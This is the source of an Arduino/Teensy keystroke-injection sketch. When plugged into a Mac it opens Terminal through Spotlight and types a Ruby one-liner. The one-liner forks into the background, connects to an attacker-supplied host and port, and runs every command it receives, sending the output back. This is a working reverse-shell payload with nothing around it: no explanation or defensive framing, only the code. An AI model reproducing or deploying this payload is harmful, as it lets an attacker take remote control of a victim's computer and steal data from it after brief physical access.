
void setup()
{
  
    delay(5000);
  run("terminal");
  delay(3000);
  Keyboard.print("ruby -rsocket -e 'exit if fork;");
  delay(100);
  Keyboard.print("c=TCPSocket.new");
  delay(100);
  Keyboard.print("(\"INPUT0\",\"INPUT1\"");
  delay(100);
  Keyboard.print(");while(cmd=c.gets);IO.popen");
  delay(100);
  Keyboard.println("(cmd,\"r\"){|io|c.print io.read}end'");
  delay(100);
    
}

void loop()
{
   
}

void run(char *SomeCommand){
  
  Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);
  Keyboard.set_key1(KEY_SPACE);
  Keyboard.send_now();

  delay(500);
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();

  Keyboard.print(SomeCommand);
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();

  Keyboard.set_key1(0);
  Keyboard.send_now();
}


